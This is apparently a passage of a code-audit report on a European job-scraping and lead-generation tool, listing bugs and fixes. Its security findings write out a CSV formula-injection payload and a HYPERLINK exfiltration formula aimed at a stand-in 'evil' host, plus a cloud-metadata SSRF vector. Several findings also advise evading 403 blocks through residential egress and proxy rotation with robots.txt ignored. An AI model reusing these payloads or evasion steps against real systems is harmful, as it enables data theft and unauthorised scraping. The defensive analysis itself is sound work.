**What happens.** _detect_adapter tests `'boards.greenhouse.io' in host`, `'smartrecruiters.com' in host`, `'jobs.ashbyhq.com' in host`, `'apply.workable.com' in host`, `'myworkdayjobs.com' in host`, `'arbeitsagentur.de' in host`, `'karrierestart.no' in host`, `'jobbsafari.no' in host`, `'arbeidsplassen.nav.no' in host`. Substring containment matches both a prefix-extended host (notboards.greenhouse.io) and a suffix-extended one (boards.greenhouse.io.evil.example.com). The adapter then ignores the supplied URL entirely and issues requests to the REAL ATS API with a slug lifted from the attacker-controlled path. discovery.py:20-34 repeats the same mistake with unanchored regexes including a bare `smartrecruiters\.com`.

**Failure.** A seed list or homepage-discovery run picks up a typosquat/phishing careers host. The pipeline attributes an unrelated real ATS board to that host, and a path segment chosen by whoever controls the lookalike domain is interpolated straight into a URL against a trusted API.

**Fix.** Match on the registrable suffix: `host == 'boards.greenhouse.io' or host.endswith('.boards.greenhouse.io')` etc., and anchor every discovery regex with `(?:^|\.)host\.tld$`. A shared `_host_is(host, 'greenhouse.io')` helper used by both modules would keep them from drifting apart again.

### rest.arbeitsagentur.de is 403 at the network level and the adapter reports the wrong cause

`src/job_scraper/adapters/arbeitsagentur.py:53` · silent-failure

**What happens.** `resolve_base` chooses between two diagnostics by calling `http.robots_allows(...)`. `HttpClient._robots_allow` short-circuits to `True` whenever `obey_robots` is false (http.py: `if not self.obey_robots: return True`). configs/regions/germany.yaml sets `obey_robots: false`, so the robots branch can never be taken there and the operator is always told the API "has probably moved again" — sending them to hunt for a new path — when the real cause is that the whole host refuses this egress IP.

**Failure.** `--config germany` runs 31 arbeitsagentur targets — described in the config as "AGGREGATOR — covers most of Germany" — and every one returns 0 while the log blames a path change. An operator follows that message and spends the session looking for a v6 endpoint that does not exist, instead of routing the request through a residential/German egress or switching to the 200-answering www.arbeitsagentur.de/jobsuche path.

**Fix.** Record the actual status code from each candidate probe and branch on it: 403-on-every-path-including-the-host-root is an egress block, not a moved endpoint. Say so explicitly, name the observed status, and stop consulting `robots_allows` for the diagnosis when `obey_robots` is off. Add https://www.arbeitsagentur.de/jobsuche/suche (HTML) as a fallback route.

### arbeitsagentur `_resolved_base` latches empty process-wide on the first failure

`src/job_scraper/adapters/arbeitsagentur.py:67` · correctness

**What happens.** `resolve_base` caches its result in a module-level global and sets `_resolved_base = ""` on failure. `if _resolved_base is not None: return _resolved_base` then makes every subsequent call return "" immediately. There is no retry and no TTL; `_reset_base_cache` is explicitly a test seam.

**Failure.** One transient hiccup on the very first probe of a run — a 429 burst, a proxy that happened to be cooling down, a 6s timeout — permanently disables all 31 arbeitsagentur targets in configs/regions/germany.yaml for the remainder of the process. The other 30 targets are never even attempted; each returns [] in microseconds and the run finishes early looking healthy.

**Fix.** Store a timestamped negative result and re-probe after a cooldown, and only latch "" after the probe has failed on N distinct attempts. Distinguish "probe returned a non-JSON/None body" (retryable) from "probe returned JSON without `stellenangebote`" (genuinely the wrong path).

### generic.py turns a careers landing page into a fake job listing, and that one fake row suppresses both the sitemap fallthrough and the Playwright escalation

`src/job_scraper/adapters/generic.py:44` · correctness

**What happens.** extract_job_postings has no anchor-clustering / listing-page path (extract.py:33-64). When a page has no JSON-LD JobPosting it falls to _is_likely_job_page (extract.py:1609), which returns True for ANY URL whose path contains /career, /jobs, /stellen etc. _finalize then fills title from <h1> or <title>, so the careers index itself becomes one JobListing. generic.py then treats a non-empty `listings` as success: line 44-45 returns before the sitemap walk, line 70-71 returns before the BFS, and line 77 `if listings: break` cancels the Playwright escalation.

**Failure.** An EU company whose job detail pages are bot-walled yields exactly one garbage row per site named after the landing page, the JS escalation that could have read the real listings never runs, and the CSV looks like it 'worked' with 1 job per company.

**Fix.** Require a real job signal before manufacturing a listing (JSON-LD/microdata, or >=2 of title+location+description+apply link), exclude index-like pages, and gate the escalation on 'found a listing with an apply URL distinct from the page URL' rather than on len(listings)>0.

### Greenhouse slug parser yields 'v1' for boards-api URLs and 'embed' for embed URLs - both are host/URL forms the dispatcher and discovery actively produce

`src/job_scraper/adapters/greenhouse.py:56` · correctness

**What happens.** _extract_slug blindly takes the first path segment. adapters/__init__.py:56 explicitly routes boards-api.greenhouse.io to this adapter, but for https://boards-api.greenhouse.io/v1/boards/{slug}/jobs the first segment is 'v1'. And discovery.discover_from_homepage matches the boards.greenhouse.io pattern against every anchor/script on a careers page, which most commonly yields the embed form https://boards.greenhouse.io/embed/job_board?for={slug} - first segment 'embed'. Both then run _resolve (5 wasted API calls) and return [].

**Failure.** A company that embeds Greenhouse via the standard iframe/script: generic.py step 1 discovers the embed URL, delegates to GreenhouseAdapter, which probes boards 'embed','embedinc','embedag','embedse','embedgmbh', returns 0 jobs, and generic.py then falls through to a full BFS of the company site for nothing.

**Fix.** Parse the slug properly: honour the ?for= query parameter for /embed/job_board, take the segment after /boards/ for boards-api URLs, and reject slugs in a denylist {'v1','embed','job_board','jobs'} rather than probing them.

### jobs.ch `language` column contains a Python dict repr

`src/job_scraper/adapters/jobsch.py:180` · data-quality

**What happens.** `listing.language = ", ".join(str(lang) for lang in langs if lang)` applies bare `str()` to each element of `language_skills`. That field is a list of objects, not of strings, so `str()` yields the Python dict literal. This is the identical class of bug commit 02ea5c3 fixed for `occupationalCategory` by introducing `_named`, and that helper was never applied here. `experience_years` on the next lines (jobsch.py:182-184) has the same unguarded `str(x)` over `work_experience`.

**Failure.** Roughly 80% of jobs.ch rows from the API path export `language` as `{'language': 'de', 'level': 3}`. Any consumer filtering on language ("German-speaking roles only") matches nothing, and the CSV column is unreadable. `models._stringify` would have JSON-encoded it correctly, but the adapter bypasses it.

**Fix.** Map the structured value: `", ".join(f"{x['language']} (L{x['level']})" for x in langs if isinstance(x, dict) and x.get('language'))`, falling back to `_stringify`. Apply the same treatment to `work_experience` -> `experience_years`.

### karrierestart.no: every posting's `description` is the site's cookie-consent banner

`src/job_scraper/adapters/karrierestart.py:7` · data-quality

**What happens.** The adapter's docstring says "Detail extraction goes through the universal smart-DOM path". Live karrierestart detail pages carry no JSON-LD JobPosting and no <dl>/<dt>/<dd> structure, so `_main_content_node` in universal.py falls through to the cookie-consent block, which is the largest text node on the page. Every ad therefore gets the same description. `deep_scrape._scrape_one` sees a truthy `uni.description` and returns `True, "ok-universal"`, so the run reports 100% success.

**Failure.** A karrierestart run exports N rows whose description column is byte-identical boilerplate. `normalize.text_blob` folds description into the keyword haystack, so a config with `keywords.include` either drops every karrierestart row (no tech term in a cookie banner) or, where the banner happens to contain a keyword, admits all of them indiscriminately. `_detect_tech` and the seniority/salary heuristics all run over the cookie banner.

**Fix.** Add a `_karrierestart_specific` description selector for the real ad body container, and add a global guard in deep_scrape: if a host's extracted description hashes identically across more than a handful of postings, log a loud warning and treat it as no description rather than "ok".

### nav, karrierestart and jobbsafari exit pagination on any HTTP failure with no log line at all

`src/job_scraper/adapters/nav.py:52` · silent-failure

**What happens.** `http.get` collapses robots-denied, 403/WAF, 429, 404, every 4xx/5xx, connection errors and block-page detection into a single `None` return. Three of the five European adapters treat that `None` as "end of results" and `break` with no logging whatsoever, so a fully blocked target is indistinguishable from an exhausted one. The only trace is the closing `logging.info("<site>: %d listings", 0)`.

**Failure.** An employee runs the scraper from a blocked IP. karrierestart.no returns 403 on page 1. The log reads "karrierestart.no: 0 listings" and the run exits 0. Nothing anywhere says the word "403", "blocked", or names a status code. This is the single biggest reason the product "isn't scraping well" without anyone being able to say why.

**Fix.** Give `HttpClient.get` a result type that distinguishes ok / blocked / rate-limited / not-found / robots-denied (a `FetchOutcome` enum or an exception), and have every adapter log a WARNING naming the status when page 1 yields nothing. At minimum, log the status code at WARNING in the 403 and >=400 branches of http.get, and change the adapters' bare `break` to `logging.warning("<site>: fetch failed at page %d (%s)", page, url); break`.

### An unknown Personio slug returns HTTP 429 with no Retry-After, costing 16 seconds of blocking sleep per bad slug

`src/job_scraper/adapters/personio.py:47` · perf

**What happens.** _resolve_bases always returns two bases (.de and .com) and _fetch_feed hits each. Personio's wildcard edge answers a non-existent {slug}.jobs.personio.de with 429 plus its marketing HTML, not 404. http.py:540-544 sees 429, computes _retry_after_seconds(None) = _DEFAULT_RETRY_AFTER_SECONDS = 8.0, logs 'backing off', marks the proxy failed, returns None, and sleeps 8s in the finally block. Two bases = ~16s of dead wall clock for a slug that simply does not exist, and the log claims rate limiting.

**Failure.** A seed list with 28 Personio slugs of which half are wrong burns ~4 minutes sleeping, and also marks a working proxy as failed once per miss (http.py:543 report_failure), eventually cooling the whole pool down over nothing.

**Fix.** Treat a 429 whose body is HTML on a *.jobs.personio.* host as 'no such board' (cache the negative), cap the no-Retry-After default far lower, and do not report_failure on a proxy for a 429 that carries no Retry-After and no proxy-level signal.

### SmartRecruiters description is always empty: jobAd.sections does not exist on the /postings list endpoint

`src/job_scraper/adapters/smartrecruiters.py:82` · data-quality

**What happens.** _to_listing reads item['jobAd']['sections'] for companyDescription/jobDescription/qualifications/additionalInformation. The v1 /companies/{id}/postings LIST response does not carry jobAd at all - only the per-posting detail endpoint /postings/{postingId} does. So `job_ad` is {} and `description` is '' for every posting the adapter ever produces.

**Failure.** Every keyword/tech-stack/seniority filter downstream that matches on description silently rejects 100% of SmartRecruiters jobs, and the person-discovery cascade has no text to work from.

**Fix.** Fetch the detail endpoint per posting (bounded/concurrent, with a cap), or accept defaultJobAd/jobAdId and resolve it; failing that, drop the dead sections code and log that descriptions are unavailable rather than emitting empty strings.

### Workable widget path reads five field names that do not exist in the live payload: location, remote, type, published

`src/job_scraper/adapters/workable.py:37` · data-quality

**What happens.** _widget reads item['location'] (dict), item['remote'], location_obj['workplace'], item['type'] and item['published']. None of those exist on apply.workable.com/api/v1/widget/accounts/{slug}. The live item is flat: city/state/country, telecommuting, employment_type, published_on. Result: location='' , remote_type='', employment_type='' for every widget-sourced job, and posted_date silently falls through to created_at, which is a different and much older date.

**Failure.** A geography-first EU run filtering on location drops 100% of Workable jobs (location is ''), and any recency window uses a date ~5 months stale.

**Fix.** Map city/state/country (or the `locations` array), telecommuting -> remote_type, employment_type -> employment_type, published_on -> posted_date. Add a shape assertion/test that fails when an expected key is absent from a live sample.

### Workable v3 path reads employment_type/published_on but the v3 payload uses type/published - the two code paths have their field names swapped

`src/job_scraper/adapters/workable.py:97` · data-quality

**What happens.** _v3 (line 84-103) reads item['employment_type'] and item['published_on'], but the v3 response items carry 'type' and 'published'. _widget reads 'type'/'published', which are the v3 names. The two field-name sets are exactly transposed between the two methods, so employment_type and posted_date are empty on both paths.

**Failure.** Any Workable account with more than 10 open roles falls to the v3 path; every row it produces has employment_type='' and posted_date='', so date-based dedupe and 'posted in the last N days' filters drop or mis-rank them all.

**Fix.** Swap the two accessors (v3: type/published; widget: employment_type/published_on) and cover each with a fixture captured from a live response.

### Workday fetches one detail request per posting inside the pagination loop, unbounded and sequential

`src/job_scraper/adapters/workday.py:53` · perf

**What happens.** For each of the 20 postings in a page the adapter calls http.get_json(detail_api) synchronously (line 53) purely to get the description, then pages again. There is no cap on detail fetches, no concurrency, and no way to skip them. Every one is robots-gated, throttled and cached, so a large tenant produces thousands of sequential round-trips before fetch_jobs returns anything at all.

**Failure.** A single large Workday tenant in the target list makes a run appear hung for hours; with delay_seconds>0 or per_host_min_delay set it is worse, and nothing is emitted until the whole board is done because fetch_jobs returns a list, not a generator.

**Fix.** Make description enrichment opt-in and bounded (max_detail_fetches), fetch details concurrently via the existing per-host throttle, and yield/stream pages so partial results survive an interruption.

### `proxies_file` that cannot be found is silently ignored — the run goes direct with no warning

`src/job_scraper/config.py:181` · silent-failure

**What happens.** `_load_proxies` tries three candidate locations for `proxies_file` and `break`s on the first hit. If none exists, the loop simply ends and the function returns whatever inline `proxies:` held — usually an empty list. There is no log line, no warning and no error. The same silence applies when the file exists but every line is blank or commented.

**Failure.** The operator writes `proxies_file: proxies.txt` (the exact name `.gitignore` reserves for it) in `configs/leads/eu-it.yaml` but launches from the repo root while the file sits next to the config — or misspells it. `HttpClient` is then constructed with `proxies=[]`, `has_proxies` is False, the concurrency boost in `main.py:69` never fires, and every request to www.sap.com / www.hellofresh.de goes out from the employee's IP and returns 403. The operator believes proxies are active because the config says so.

**Fix.** Raise `ValueError` (or at minimum `logging.warning`) when `proxies_file` is set and no candidate resolves, and log the resolved path plus the count of proxies loaded. Log a warning when the merged list is empty while `proxies_file` was configured.

### A typo'd top-level config section is silently ignored — filters and export destinations vanish without an error

`src/job_scraper/config.py:258` · silent-failure

**What happens.** `_build` rejects unknown keys *inside* a section, and its docstring advertises that protection, but `load_config` never validates the top-level key set: it reads `run`, `keywords`, `locations`, `targets`, `exports` by name and drops everything else. `general_scraper.config.load_general_config` has the identical hole. A singular/plural or language slip produces a valid config that silently does something different.

**Failure.** `exports:` is written as `export:` in a production config. The run scrapes normally and writes to the default `output/jobs.csv` instead of the configured path, while the operator watches the configured path and concludes the scraper produced nothing. With `keywords:` mistyped, every filter is disabled and the CSV fills with irrelevant postings — the opposite failure, equally silent.

**Fix.** After `load_raw`, compute `set(raw) - {'run','keywords','locations','targets','exports','mode'}` and raise `ValueError` listing the unknown top-level keys and the valid ones — exactly what `_build` already does per section. Mirror it in `load_general_config`.

### Config values are never type-coerced or range-checked; a quoted number or a zero crashes the run mid-scrape

`src/job_scraper/config.py:221` · correctness

**What happens.** `_build` does `cls(**raw)` — dataclasses do not enforce annotations, so YAML strings, floats where ints are expected, and out-of-range values flow through untouched. There is no post-validation of `deep_concurrency`, `deep_per_host_concurrency`, `max_pages`, `max_depth`, `delay_seconds`, `llm_monthly_budget_usd`, etc. The failure surfaces far from the config, deep inside the thread pool, after the first target has already been fetched.

**Failure.** An operator quotes a value (`deep_concurrency: "12"`) — normal YAML habit. The config loads, the first target is scraped, and the run dies with a bare `TypeError` from `concurrent.futures` the moment deep-scrape starts. All work to that point is lost (see the no-checkpoint finding) and the traceback points at the thread pool, not the config line.

**Fix.** After `_build`, coerce each field to its declared annotation (`int(...)`, `float(...)`, `bool(...)`) inside a try that re-raises as a config error naming the key, and validate ranges: concurrency ≥ 1, delays ≥ 0, `max_pages`/`max_depth` ≥ 1, budget ≥ 0.

### The "unknown keys are a hard error" guarantee does not hold for keywords, locations, exports, or the top level

`src/job_scraper/config.py:273` · silent-failure

**What happens.** configs/README.md:49-53 states: "Unknown keys are now a hard error rather than being silently ignored — a typo in `deep_concurency:` used to leave the default in place with no warning," and CHANGELOG.md:11 repeats it. The `_build` helper (config.py:221-246) does reject unknowns, but it is only applied to `run` (:269), `targets[i]` (:292) and the four `exports.*` leaves (:299-302). `KeywordConfig` is constructed field-by-field at :274-278 and `LocationConfig` at :281-286, both with `raw.get(...)` lookups that ignore anything else in the section. `exports` itself is read through `_section` at :297 with no unknown-key check, and the top-level `raw` dict is never validated at all — `load_config` only pulls the five keys it knows about.

**Failure.** An operator writes `locations:\n  requires_match: true` (extra s) instead of `require_match`. Line 284 reads `locations_raw.get("require_match", False)` -> False, the config loads without complaint, and every location filter is silently disabled for the run. Same for `keyword:` instead of `keywords:` at the top level, `excludes:` instead of `exclude:`, or `export:` instead of `exports:` — which would silently disable the CSV writer. The CI job at .github/workflows/ci.yml:75-93 loads every shipped config and would print `OK` for all of them.

**Fix.** Route `keywords`, `locations` and the `exports` container through `_build` (or an equivalent unknown-key check), and validate the top-level key set against `{run, keywords, locations, targets, exports, mode}`. Then the claim in configs/README.md:49 becomes true.

### PlaywrightFetcher leaks a Chromium process and node driver when `__enter__` fails part-way, and when `__exit__`'s first close() raises

`src/job_scraper/crawl.py:121` · correctness

**What happens.** `__enter__` performs four ordered side-effecting steps (`sync_playwright().start()`, `chromium.launch()`, `new_context()`, `context.route()`). If any later step raises, the earlier resources are never released: `__exit__` is not called because `__enter__` did not return, and both call sites catch the exception and set the fetcher to `None`, dropping the only reference. `__exit__` has the mirror bug: all three closes share one `with suppress(Exception)` block, so if `self._context.close()` raises — routine when the browser has already crashed or the page is hung — `browser.close()` and `playwright.stop()` are skipped entirely.

**Failure.** A machine under memory pressure fails at `new_context()`. The launched Chromium and the node driver stay resident for the entire run and are never reaped; `main.py` logs "Playwright init failed … falling back to HTTP-only" and continues. Run it hourly on an employee laptop from cron and you accumulate zombie Chromium processes until the box swaps.

**Fix.** Wrap `__enter__`'s body in try/except that calls a `_teardown()` helper before re-raising. Split `__exit__` into three independent `with suppress(Exception)` blocks (context, browser, playwright) so a failure in one still runs the others, and null the attributes afterwards so a double `__exit__` is a no-op.

### Every Playwright page burns ~12 s of fixed waits — measured on a trivial local page — and all of it is serialised behind one lock

`src/job_scraper/crawl.py:173` · perf

**What happens.** `_wait_for_job_content` waits up to 6 s for a JobPosting JSON-LD / microdata / ≥3 job-link predicate, and hits the full timeout on any page that does not satisfy it — which is every detail page without JSON-LD (exactly the pages Playwright exists for) and *every* page in general mode, where a JobPosting predicate can never be true. `_expand_content` then clicks eight different labels, each with an 800 ms timeout, so a page with no expander burns another ~6 s. `_playwright_get` serialises all of this behind `_PLAYWRIGHT_LOCK`, so the cost does not amortise across `deep_concurrency` workers.

**Failure.** A general-mode run over 500 business detail pages with `use_playwright: true` (as `configs/general.example.yaml` ships) spends ≥100 minutes purely in `_wait_for_job_content` waiting for a JobPosting marker that a restaurant page will never have, on top of the real page-load time — and the operator reads it as "the scraper is slow/hung".

**Fix.** Make the readiness predicate and its timeout injectable (job predicate for job mode, a generic `document.readyState`/selector predicate for general mode) and drop the timeout to ~2 s. Replace the eight blind `get_by_role(...).click(timeout=800)` calls with a single `count()` check before clicking, and skip expansion entirely when no candidate exists.

### Crawler.max_pages bounds successful fetches, not HTTP requests - a bot-walled site gets ~60x the intended request budget

`src/job_scraper/crawl.py:233` · perf

**What happens.** `while queue and pages < self.max_pages` with `pages += 1` only at line 248, after a successful fetch. Every failed fetch (403, 429, robots-denied, WAF body) returns None at line 240-241 and is skipped without incrementing `pages`. So the loop keeps draining a queue that was filled by the handful of pages that did succeed. On exactly the sites the user reports failing (403 walls) the crawler issues every discovered link.

**Failure.** A careers hub that returns 200 but 403s its job pages: max_pages=200 with 200 links/page means up to ~40,000 requests against one host, each paced by delay_seconds and the per-host throttle. The run appears hung and burns whatever proxy budget exists.

**Fix.** Count attempts, not successes: increment a `requests_made` counter before the fetch and break on it, keeping max_pages as a separate successful-page cap. Add a consecutive-failure circuit breaker per host.

### discovery.fetch_sitemap_urls only parses the exact sitemaps.org namespace, silently returning zero URLs for namespace-less and legacy sitemaps

`src/job_scraper/discovery.py:132` · data-quality

**What happens.** `fetch_sitemap_urls` hardcodes `ns = {"sm": "http://www.sitemaps.org/schemas/sitemap/0.9"}` and uses `root_xml.findall(".//sm:url/sm:loc", ns)` / `.//sm:sitemap/sm:loc`. ElementTree namespace matching is exact-string, so a sitemap served with no default namespace, with the legacy Google 0.84 namespace, or with the `https://` spelling of the sitemaps.org URI yields an empty list. The function then returns `[]` with no log line, and `generic.py:47` treats that as "this site has no sitemap" and falls through to the BFS crawl - which is slower, burns the page budget, and misses the job URLs the sitemap listed. The leadgen half of the codebase gets this right (`sitemap.py:85` uses `element.tag.rsplit("}", 1)[-1]`, namespace-agnostic), so the two halves disagree about how to read the same file format.

**Failure.** A German Mittelstand careers site serves `<?xml version="1.0"?><urlset><url><loc>https://firma.de/stellen/entwickler-123</loc></url></urlset>` - valid, widely deployed, no xmlns. `fetch_sitemap_urls` parses it successfully (safe_xml returns a real Element), finds zero `<loc>` entries, and returns []. generic.py logs nothing, skips the "sitemap -> N job URLs" info line, and BFS-crawls the site instead, typically capping out at max_pages before reaching the job detail pages. Every job on that site is lost.

**Fix.** Strip namespaces the way leadgen's sitemap.py does - iterate `root_xml.iter()` and compare `tag.rsplit('}', 1)[-1]` against 'loc', using the parent tag to distinguish `<sitemap>` from `<url>`. Better, factor the leadgen `_urls_in` helper into a shared module and have both halves call it. Log at INFO when a sitemap parses but yields zero locs, so this failure is visible.

### CSV export writes scraped text verbatim — no spreadsheet formula-injection guard

`src/job_scraper/export/csv_exporter.py:37` · security

**What happens.** `csv.DictWriter.writerow(job.to_dict())` quotes fields for CSV correctness but does nothing about leading `=`, `+`, `-`, `@`, tab or CR. Every value in the row originates from a remote page (title, company, description, recruiter_name, and — via `llm_adapter._apply_map` — model-chosen strings derived from that page). The exported CSV is the product's deliverable and is opened in Excel / Google Sheets / LibreOffice by sales staff.

**Failure.** A posting's company field is `=cmd|'/c powershell -w hidden IEX(...)'!A1` (or the far more common `=HYPERLINK("https://evil/"&A2&B2,"View")` data-exfiltration form). The row lands in `output/jobs.csv`; a sales rep opens it in Excel, clicks through the prompt, and leaks the whole lead list or executes a command. The same strings also flow into Notion and Google Sheets exports.

**Fix.** Prefix any value starting with `= + - @ \t \r` with a single quote (or wrap it) before writing — apply it once in a shared `_sanitize_cell` used by `csv_exporter`, `gsheets_exporter` (which sends `value_input_option="RAW"`, so it is safer but still worth normalising) and `general_scraper.main._write_csv`.

### "mo" shadows "monat"/"mois" in the salary unit alternation, so German/French monthly pay is labelled "year"

`src/job_scraper/extract.py:1094` · correctness

**What happens.** The unit alternation is `(year|yr|p\.a\.|annual|jahr|jährlich|annee|année|month|mo|monat|monatlich|mois|hour|...)`. Python regex alternation is first-match, so for the input "Monat" the branch `mo` wins before `monat` can be tried, capturing only "Mo". The classifier then tests `"month" in 'mo'` (False), `"monat" in 'mo'` (False), `"mois" in 'mo'` (False), falls through the hour branch, and lands on the `else: j.salary_period = "year"`. Same for French "mois" (also shadowed by `mo`).

**Failure.** A Swiss posting quoting CHF 8'500 pro Monat (once the 4-digit bug is fixed) exports salary_period='year'. Combined with the previous finding, German 'Jahr' -> hour and German 'Monat' -> year: the two periods are literally swapped.

**Fix.** Order the alternation longest-first (monatlich|monat|month|mois|mo) — or better, drop the bare `mo` alternative entirely.

### The `k` suffix in "EUR 45k - 60k" is consumed but never multiplied, exporting a 45 EUR salary

`src/job_scraper/extract.py:1088` · correctness

**What happens.** SALARY_RX includes `(?:k\b|tausend|thousand)?` after the first amount, but neither the regex nor _normalize_amount nor _apply_heuristics ever scales the captured number by 1000. The multiplier token is matched and discarded.

**Failure.** A startup posting on an EU board says "EUR 55k - 70k". The CSV exports salary_min=55, salary_max=70.

**Fix.** Capture the multiplier token as its own group and multiply the normalised amount by 1000 when present; apply it to both ends of a range.

### extract._is_likely_job_page rejects French and Italian pages, so extract_job_postings returns [] for them

`src/job_scraper/extract.py:1609` · correctness

**What happens.** The second gate has German coverage (/stellen, bewerben, aufgaben, anforderung) but no French or Italian path tokens (/emploi, /offre, /carriere, /lavoro, /posizioni) and no French/Italian text signals at all. When a page has no JSON-LD JobPosting, extract_job_postings falls through to this gate; a False result returns an empty list and the whole extract path yields nothing for that page.

**Failure.** A French employer career page at /emploi/12345 with a 'Vos missions' / 'Votre profil' / 'Postuler' layout and no Schema.org markup produces zero JobListings from extract.py AND None from universal_extract — total extraction failure on the page.

**Fix.** Add /emploi, /offre, /carriere, /lavoro, /posizioni, /vacature, /empleo to the path list and postuler/candidature/missions/profil/candidatura/requisiti/mansioni to the signal list; or unify with universal's gate.

### The "do not invent people out of page furniture" fix is incomplete: <footer> is not treated as chrome, so cookie/imprint text becomes recruiter_name

`src/job_scraper/extract.py:1332` · data-quality

**What happens.** _is_site_chrome walks ancestors looking for `nav`/`header`, checks role attributes, and checks link density > 12. It deliberately omits `footer` even though `footer` is in _apply_recruiter's candidate list (line 1346). A footer with low link density containing a title keyword ('Talent Acquisition') therefore passes, and PERSON_NAME_RX — which accepts any run of 2-4 Capitalised+lowercase words with no dictionary check — harvests the boilerplate.

**Failure.** Any German site whose footer mentions a talent/HR team and carries the mandatory Impressum/Datenschutz links exports 'Datenschutz Impressum ...' as a person's name. Sold as a lead, it is an obviously fabricated contact.

**Fix.** Add 'footer' (and role='contentinfo') to the chrome ancestor test in _is_site_chrome, and reject PERSON_NAME_RX candidates whose tokens hit a stoplist (Datenschutz, Impressum, Cookie, Barrierefreiheit, Privacy, Terms, Rights, Reserved, Einstellungen, ...). universal.py already has such a stoplist (bad_label_rx); extract.py has none.

### RECRUITER_EMAIL_RX has no word boundaries, so any address containing the letters "hr" is promoted to recruiter_email

`src/job_scraper/extract.py:1103` · data-quality

**What happens.** `re.compile(r"jobs?|career|talent|recruit|hr|hiring|people|personal", re.I)` is applied with .search() against the whole address. 'hr' occurs inside a very large share of German-language names: Christian, Christoph, Christine, Schröder/Schroeder, Rohrer, Fahrner, Lehr-, Ohr-. The identical un-bounded pattern is duplicated inline in universal.mine_contacts (line 127).

**Failure.** On a page listing several employee addresses, christian.bauer@siemens.com is selected as recruiter_email (and therefore also as application_email) over the actual bewerbung@siemens.com. Applications and outreach go to an unrelated engineer.

**Fix.** Anchor the tokens to address-component boundaries: `(?:^|[._%+\-])(jobs?|careers?|talent|recruit\w*|hr|hiring|people|personal\w*|bewerbung|stellen)(?:[._%+\-]|@)` and de-duplicate the pattern between the two modules.

### extract.PHONE_INTL_RX and PHONE_RX truncate or drop the country code on numbers with a 1-digit area code (+33 1…, +43 1…)

`src/job_scraper/extract.py:407` · correctness

**What happens.** PHONE_INTL_RX is a fixed 5-group shape `\+\d{1,3}\s?\d{1,4}\s?\d{2,4}\s?\d{2,4}\s?\d{2,4}` with no optional tail, so a French number that needs 6 groups is cut short. The looser fallback PHONE_RX makes the `\+\d{1,3}[\s.\-]?` prefix optional but then requires `\d{2,4}` — a 1-digit area code fails, so the engine abandons the '+' prefix and matches a fragment mid-string instead.

**Failure.** A French employer prints '+33 1 42 68 53 00'. _extract_contact_info stores recruiter_phone='+33 1 42 68 53' — a number that cannot be dialled. The Austrian case stores '234 5678' with no country or area code at all.

**Fix.** Replace both with one tolerant pattern: `\+\d{1,3}(?:[\s.\-/]?\d{1,4}){2,6}` (plus an `00`-prefixed variant), then validate by digit count (8-15) rather than by group shape.

### apply_url extracted from a JSON-LD description is never resolved against the page URL and exports as a relative path

`src/job_scraper/extract.py:456` · correctness

**What happens.** _parse_jd_sections stores the raw `href` (`out.setdefault("apply_url", href)`) with no urljoin — unlike _find_apply_url, which does urljoin. _apply_jsonld copies it onto j.apply_url. _finalize then only replaces apply_url `if not j.apply_url or _is_junk_url(j.apply_url)`, and _is_junk_url treats a relative path as valid (scheme '' is in its allowed set), so the relative value survives to the CSV.

**Failure.** Every posting whose Schema.org description embeds a relative apply link exports apply_url='/karriere/apply?id=9'. The column is unusable and, worse, non-empty — so the ATS-preferring fallback in _finalize is skipped.

**Fix.** urljoin the href in _parse_jd_sections (the base URL must be threaded in), or have _is_junk_url treat a scheme-less URL as junk so _finalize recomputes it.

### JSON-LD blocks are dropped whole on five common real-world encodings (control chars, escaped markup, CDATA, concatenated objects, full-URI @type)

`src/job_scraper/extract.py:85` · correctness

**What happens.** _iter_json_ld does json.loads with default strict=True and a single repair attempt that only strips trailing commas. _is_job_posting compares the lowercased @type to the literal 'jobposting'. _flatten_json_ld only unwraps single-key wrappers. The in-code comment claims concatenated objects are handled; the repair does not handle them.

**Failure.** An employer's JSON-LD description contains a literal newline (technically invalid but very common in hand-assembled markup). The block is discarded, so title/company/salary/datePosted/validThrough are lost and the page falls back to DOM heuristics — which, per the other findings, frequently fail on EU pages.

**Fix.** Use json.loads(text, strict=False); strip a leading //<![CDATA[ / trailing //]]>; html.unescape when the text contains '&quot;' and no '"'; use raw_decode in a loop for concatenated objects; accept @type values ending in '/jobposting' after stripping any schema.org URI prefix; and recurse into dict values of any wrapper whose @type is not itself a JobPosting.

### HttpClient enforces no guard; only 4 of ~50 fetch sites call guard(), and every job_scraper fetch path is unguarded

`src/job_scraper/http.py:495` · security

**What happens.** The guard is an opt-in decoration at four leadgen call sites, not a property of the transport. `HttpClient.get` / `get_json` / `post_json` / `head` never import or call `net_guard`. A full grep finds exactly four `guard(` / `is_safe_url(` call sites in src/: domain.py:125, cascade.py:59, cascade.py:119, sitemap.py:111 (+ sitemap.py:126 for selection). Every other fetch site is unguarded, including several that fetch URLs taken verbatim from remote documents.

Unguarded sites that consume remote, attacker-influenced URLs:
- src/job_scraper/discovery.py:107 `http.get(f"{root}/robots.txt")` then :127 fetches every `Sitemap:` directive from that robots.txt with no host or scheme restriction.
- src/job_scraper/discovery.py:127 sitemap-index `<loc>` children are pushed onto the queue (`queue.append(child)`) and fetched with no domain check at all.
- src/job_scraper/adapters/generic.py:53 `http.get(url, allow_404=True)` over URLs returned by `fetch_sitemap_urls` - any host.
- src/job_scraper/crawl.py:239 `self.http.get(url)` over BFS-discovered links; `_is_allowed_url` only filters scheme/extension and, when `allow_domains` is empty, returns True for everything (crawl.py:297).
- src/job_scraper/deep_scrape.py:137 `http.get(listing.job_url or listing.apply_url, allow_404=True)` - apply_url comes straight from scraped JSON-LD.
- src/leadgen/seed/jobsch.py:229 `http.get(profile)` where `profile` is the remote `sameAs` field, gated only by the substring test `if "jobs.ch/" in profile` (jobsch.py:167) - `http://169.254.169.254/jobs.ch/` satisfies that test.
- src/general_scraper/main.py:220 `_fetch` over `_next_page_url`, which follows `rel=next` / `a[rel=next]` hrefs from remote HTML with no host restriction.

**Failure.** A company's robots.txt (which anyone who controls that host writes) contains `Sitemap: http://169.254.169.254/latest/meta-data/`. `discovery.fetch_sitemap_urls` appends it to `candidates` and fetches it at line 127 with no guard, no host check and no scheme check. The body is parsed as XML; whatever `<loc>` entries it yields are then fetched by generic.py:53. The leadgen guard is irrelevant here because this is the job_scraper half, which never had one.

**Fix.** Move the check into the transport: call `guard()` at the top of `HttpClient.get`/`get_json`/`post_json`/`head` and on every redirect hop, so it cannot be forgotten, and delete the scattered call-site guards (or keep them as cheap pre-filters). Separately, restrict sitemap-index recursion and `rel=next` following to the origin the document came from.

### get() never retries and never rotates proxies on 403/429/block, despite the docstring promising a retry layer — the lead path has none

`src/job_scraper/http.py:545` · correctness

